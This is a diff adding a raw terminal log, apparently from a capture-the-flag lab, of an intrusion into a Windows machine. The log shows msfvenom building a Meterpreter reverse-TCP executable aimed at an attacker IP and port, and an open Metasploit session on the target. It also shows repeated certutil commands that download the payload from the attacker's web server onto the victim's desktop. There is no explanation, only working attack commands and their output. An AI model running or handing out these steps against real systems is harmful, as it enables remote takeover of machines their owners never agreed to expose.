@@ -1,1 +1,88 @@
+hippoeug@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=4545 -f exe -o meterpreter.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: meterpreter.exe
+
+
+
+
+
+
+
+
+msf5 > sessions -i 1
+[*] Starting interaction with 1...
+
+
+C:\Users\kostas\Desktop>certutil.exe
+certutil.exe
+CertUtil: -dump command completed successfully.
+
+C:\Users\kostas\Desktop>dir      
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+
+ Directory of C:\Users\kostas\Desktop
+
+23/01/2021  02:49 ��    <DIR>          .
+23/01/2021  02:49 ��    <DIR>          ..
+18/03/2017  02:11 ��           760.320 hfs.exe
+               1 File(s)        760.320 bytes
+               2 Dir(s)  31.897.280.512 bytes free
+
+C:\Users\kostas\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+
+ Directory of C:\Users\kostas\Desktop
+
+23/01/2021  02:49 ��    <DIR>          .
+23/01/2021  02:49 ��    <DIR>          ..
+18/03/2017  02:11 ��           760.320 hfs.exe
+               1 File(s)        760.320 bytes
+               2 Dir(s)  31.897.280.512 bytes free
+
+C:\Users\kostas\Desktop>certutil.exe -urlcache -split -f "http://10.10.14.15:80/meterpreter.exe" meterpreter.exe
+certutil.exe -urlcache -split -f "http://10.10.14.15:80/meterpreter.exe" meterpreter.exe
+****  Online  ****
+  0000  ...
+  00c3
+CertUtil: -URLCache command FAILED: 0x80190194 (-2145844844 HTTP_E_STATUS_NOT_FOUND)
+CertUtil: Not found (404).
+
+C:\Users\kostas\Desktop>certutil.exe -urlcache -split -f "http://10.10.14.15:80/meterpreter.exe" meterpreter.exe
+certutil.exe -urlcache -split -f "http://10.10.14.15:80/meterpreter.exe" meterpreter.exe
+****  Online  ****
+  0000  ...
+  00c3
+CertUtil: -URLCache command FAILED: 0x80190194 (-2145844844 HTTP_E_STATUS_NOT_FOUND)
+CertUtil: Not found (404).
+
+C:\Users\kostas\Desktop>certutil.exe -urlcache -split -f "http://10.10.14.15:80/meterpreter.exe" meterpreter.exe
+certutil.exe -urlcache -split -f "http://10.10.14.15:80/meterpreter.exe" meterpreter.exe
+****  Online  ****
+  0000  ...
+  1c00
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\kostas\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+
+ Directory of C:\Users\kostas\Desktop
+
+23/01/2021  04:59 ��    <DIR>          .
+23/01/2021  04:59 ��    <DIR>          ..
+18/03/2017  02:11 ��           760.320 hfs.exe
+23/01/2021  05:04 ��             7.168 meterpreter.exe
+               2 File(s)        767.488 bytes
+               2 Dir(s)  31.897.223.168 bytes free
+
+C:\Users\kostas\Desktop>
 
